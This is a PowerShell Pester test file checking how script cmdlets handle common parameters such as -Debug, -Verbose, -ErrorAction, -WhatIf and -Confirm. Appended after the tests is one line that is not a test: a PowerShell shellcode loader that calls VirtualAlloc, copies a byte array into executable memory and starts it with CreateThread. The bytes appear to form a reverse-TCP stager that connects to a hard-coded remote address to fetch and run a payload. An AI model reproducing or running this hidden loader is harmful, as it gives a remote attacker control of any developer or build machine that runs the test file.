

Describe "Common parameters support for script cmdlets" -Tags "CI" {
    BeforeEach {
        $rs = [system.management.automation.runspaces.runspacefactory]::CreateRunspace()
        $rs.open()
        $ps = [System.Management.Automation.PowerShell]::Create()
        $ps.Runspace = $rs
    }

    AfterEach {
            $ps.Dispose()
            $rs.Dispose()
    }

    Context "Debug" {
        BeforeAll {
            $script = "
                function get-foo
                {
                    [CmdletBinding()]
                    param()

                    write-output 'output foo'
                    write-debug  'debug foo'
                }"
        }

        It "Debug get-foo" {
            $command = 'get-foo'
            [void] $ps.AddScript($script + $command)
            $asyncResult = $ps.BeginInvoke()
            $output = $ps.EndInvoke($asyncResult)

            $output[0] | Should -BeExactly "output foo"
            $ps.Streams.Debug.Count | Should -Be 0
        }

        It 'get-foo -debug' {
            $command = 'get-foo -debug'
            [void] $ps.AddScript($script + $command)
            $asyncResult = $ps.BeginInvoke()
            $output = $ps.EndInvoke($asyncResult)

            $output[0] | Should -BeExactly "output foo"
            $ps.Streams.Debug[0].Message | Should -BeExactly "debug foo"
            $ps.InvocationStateInfo.State | Should -BeExactly 'Completed'
        }
    }

    Context "verbose" {
        BeforeAll {
            $script = "
                function get-foo
                {
                    [CmdletBinding()]
                    param()

                    write-output 'output foo'
                    write-verbose  'verbose foo'
                }"
        }

        It 'get-foo' {
            $command = 'get-foo'
            [void] $ps.AddScript($script + $command)
            $asyncResult = $ps.BeginInvoke()
            $output = $ps.EndInvoke($asyncResult)

            $output[0] | Should -BeExactly "output foo"
            $ps.streams.verbose.Count | Should -Be 0
        }

        It 'get-foo -verbose' {
            $command = 'get-foo -verbose'

            [void] $ps.AddScript($script + $command)
            $asyncResult = $ps.BeginInvoke()
            $output = $ps.EndInvoke($asyncResult)

            $output[0] | Should -BeExactly "output foo"
            $ps.Streams.verbose[0].Message | Should -BeExactly "verbose foo"
            $ps.InvocationStateInfo.State | Should -BeExactly 'Completed'
        }
    }

    Context "erroraction" {
        BeforeAll {
            $script = "
                function get-foo
                {
                    [CmdletBinding()]
                    param()

                    write-error  'error foo'
                    write-output 'output foo'
                }"
            }

        It 'erroraction' {

            $command = 'get-foo'
            [void] $ps.AddScript($script + $command)
            $asyncResult = $ps.BeginInvoke()
            $output = $ps.EndInvoke($asyncResult)

            $output[0] | Should -BeExactly "output foo"
            $ps.Streams.error[0].ToString() | Should -Match "error foo"
        }

        It 'erroraction continue' {

            $command = 'get-foo -erroraction Continue'
            [void] $ps.AddScript($script + $command)
            $asyncResult = $ps.BeginInvoke()
            $output = $ps.EndInvoke($asyncResult)

            $output[0] | Should -BeExactly "output foo"
            $ps.Streams.error[0].ToString() | Should -Match "error foo"
        }

        It 'erroraction SilentlyContinue' {

            $command = 'get-foo -erroraction SilentlyContinue'
            [void] $ps.AddScript($script + $command)
            $asyncResult = $ps.BeginInvoke()
            $output = $ps.EndInvoke($asyncResult)

            $output[0] | Should -BeExactly "output foo"
            $ps.streams.error.count | Should -Be 0
        }

        It 'erroraction Stop' {

            $command = 'get-foo -erroraction Stop'

            [void] $ps.AddScript($script + $command)
            $asyncResult = $ps.BeginInvoke()

            { $ps.EndInvoke($asyncResult) } | Should -Throw -ErrorId "ActionPreferenceStopException"
            

            
            

            $ps.InvocationStateInfo.State | Should -BeExactly 'Failed'
        }
    }

    Context "SupportShouldprocess" {
        $script = '
                function get-foo
                {
                    [CmdletBinding(SupportsShouldProcess=$true)]
                    param()

                    if($pscmdlet.shouldprocess("foo", "foo action"))
                    {
                        write-output "foo action"
                    }
                }'

        It 'SupportShouldprocess' {

            $command = 'get-foo'
            $ps = [system.management.automation.powershell]::Create()
            [void] $ps.AddScript($script + $command)
            $ps.RunspacePool = $rp
            $asyncResult = $ps.BeginInvoke()
            $output = $ps.EndInvoke($asyncResult)

            $output[0] | Should -BeExactly 'foo action'
        }

        It 'shouldprocess support -whatif' {

            $command = 'get-foo -whatif'
            $ps = [system.management.automation.powershell]::Create()
            [void] $ps.AddScript($script + $command)
            $ps.RunspacePool = $rp
            $asyncResult = $ps.BeginInvoke()
            $output = $ps.EndInvoke($asyncResult)

            $ps.InvocationStateInfo.State | Should -BeExactly 'Completed'
        }

        It 'shouldprocess support -confirm under the non-interactive host' {

            $command = 'get-foo -confirm'
            [void] $ps.AddScript($script + $command)

            $asyncResult = $ps.BeginInvoke()
            $ps.EndInvoke($asyncResult)

            $ps.Streams.Error.Count | Should -Be 1 
            $ps.InvocationStateInfo.State | Should -BeExactly 'Completed'
        }
    }

    Context 'confirmimpact support: none' {
        BeforeAll {
            $script = '
                function get-foo
                {
                    [CmdletBinding(supportsshouldprocess=$true, ConfirmImpact="none")]
                    param()

                    if($pscmdlet.shouldprocess("foo", "foo action"))
                    {
                        write-output "foo action"
                    }
                }'
        }

        It 'get-foo' {
            $command = 'get-foo'
            [void] $ps.AddScript($script + $command)
            $asyncResult = $ps.BeginInvoke()
            $output = $ps.EndInvoke($asyncResult)

            $output[0] | Should -BeExactly 'foo action'
        }

        It 'get-foo -confirm' {
            $command = 'get-foo -confirm'
            [void] $ps.AddScript($script + $command)
            $asyncResult = $ps.BeginInvoke()
            $output = $ps.EndInvoke($asyncResult)

            $output[0] | Should -BeExactly 'foo action'
        }
    }

    Context 'confirmimpact support: low under the non-interactive host' {
        BeforeAll {
            $script = '
                function get-foo
                {
                    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact="low")]
                    param()

                    if($pscmdlet.shouldprocess("foo", "foo action"))
                    {
                        write-output "foo action"
                    }
                }'
        }
        It 'get-foo' {
            $command = 'get-foo'
            [void] $ps.AddScript($script + $command)
            $asyncResult = $ps.BeginInvoke()
            $output = $ps.EndInvoke($asyncResult)

            $output[0] | Should -BeExactly 'foo action'
        }

        It 'get-foo -confirm' {
            $command = 'get-foo -confirm'

            [void] $ps.AddScript($script + $command)
            $asyncResult = $ps.BeginInvoke()
            $ps.EndInvoke($asyncResult)

            $ps.Streams.Error.Count | Should -Be 1  
            $ps.InvocationStateInfo.State | Should -BeExactly 'Completed'
        }
    }

    Context 'confirmimpact support: Medium under the non-interactive host' {
        BeforeAll {
            $script = '
                function get-foo
                {
                    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact="medium")]
                    param()

                    if($pscmdlet.shouldprocess("foo", "foo action"))
                    {
                        write-output "foo action"
                    }
                }'
        }

        It 'get-foo' {
            $command = 'get-foo'
            [void] $ps.AddScript($script + $command)
            $asyncResult = $ps.BeginInvoke()
            $output = $ps.EndInvoke($asyncResult)

            $output[0] | Should -BeExactly 'foo action'
        }

        It 'get-foo -confirm' {
            $command = 'get-foo -confirm'
            [void] $ps.AddScript($script + $command)

            $asyncResult = $ps.BeginInvoke()
            $ps.EndInvoke($asyncResult)

            $ps.Streams.Error.Count | Should -Be 1  
            $ps.InvocationStateInfo.State | Should -BeExactly 'Completed'
        }
    }

    Context 'confirmimpact support: High under the non-interactive host' {
        BeforeAll {
            $script = '
                function get-foo
                {
                    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact="high")]
                    param()

                    if($pscmdlet.shouldprocess("foo", "foo action"))
                    {
                        write-output "foo action"
                    }
                }'
        }

        It 'get-foo' {
            $command = 'get-foo'
            [void] $ps.AddScript($script + $command)
            $asyncResult = $ps.BeginInvoke()
            $ps.EndInvoke($asyncResult)

            $ps.Streams.Error.Count | Should -Be 1 
            $ps.InvocationStateInfo.State | Should -BeExactly 'Completed'
        }

        It 'get-foo -confirm' {
            $command = 'get-foo -confirm'
            [void] $ps.AddScript($script + $command)
            $asyncResult = $ps.BeginInvoke()
            $ps.EndInvoke($asyncResult)

            $ps.Streams.Error.Count | Should -Be 1 
            $ps.InvocationStateInfo.State | Should -BeExactly 'Completed'
        }
    }

    Context 'ShouldContinue Support under the non-interactive host' {
        BeforeAll {
            $script = '
                function get-foo
                {
                    [CmdletBinding()]
                    param()

                    if($pscmdlet.shouldcontinue("foo", "foo action"))
                    {
                        write-output "foo action"
                    }
                }'
        }

        It 'get-foo' {
            $command = 'get-foo'
            [void] $ps.AddScript($script + $command)

            $asyncResult = $ps.BeginInvoke()
            $ps.EndInvoke($asyncResult)

            $ps.Streams.Error.Count | Should -Be 1   
            $ps.InvocationStateInfo.State | Should -BeExactly 'Completed'
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xad,0xff,0xcc,0xc0,0x68,0x02,0x00,0x92,0xb1,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

